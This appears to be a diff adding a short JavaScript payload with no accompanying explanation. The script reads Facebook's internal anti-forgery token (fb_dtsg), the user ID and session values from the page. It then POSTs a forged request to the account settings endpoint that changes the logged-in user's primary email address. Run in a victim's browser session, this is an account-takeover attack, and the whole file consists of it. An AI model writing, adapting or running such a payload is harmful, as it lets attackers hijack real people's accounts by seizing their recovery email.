@@ -1,0 +1,17 @@
+var spinR = require(["SiteData"]).__spin_r;
+var spinB = require(["SiteData"]).__spin_b;
+var spinT = require(["SiteData"]).__spin_t;
+var jazoest = require(["SprinkleConfig"]).jazoest;
+var fbdtsg = require(["DTSGInitData"]).token;
+var userId = require(["CurrentUserInitialData"]).USER_ID;
+var hsi = require(["SiteData"]).hsi;
+var email = "hotmail";
+var url = "https://www.facebook.com/settings/account/email/primary/?contact=" + email;
+var data = "__user="+userId+"&__a=1&__dyn=7xeUmBwjbg7ebwKheC1swgE98nwgU6C7UW3q327E2vzobohw5cx60Vo2Vwb-q1ew8y11wbG782CwnUaE7i0n2US1vwnEO0FE9kbxS2218w4wwZwaO2W0D83mwkE5G0zE5W0HUvw5rwSyES0gq0Lo6-&__csr=&__req=3&__hs=19144.BP%3ADEFAULT.2.0.0.0.&dpr=1&__ccg=MODERATE&__rev=1005610942&__s=nhvddc%3Aehxlzq%3A6r6r99&__hsi="+hsi+"&__comet_req=0&cquick=jsc_c_1c&cquick_token=AQ6ImlJJ6kwAJvRPgnQ&ctarget=https%3A%2F%2Fwww.facebook.com&fb_dtsg="+fbdtsg+"&jazoest=22037&lsd=dT0wxoq255PQY5WWDvB7GS&__spin_r="+spinR+"&__spin_b=trunk&__spin_t="+spinT;
+fetch(url, {
+    method: 'POST',
+    body: data,
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+}).then(e => e.text()).then(e => {})
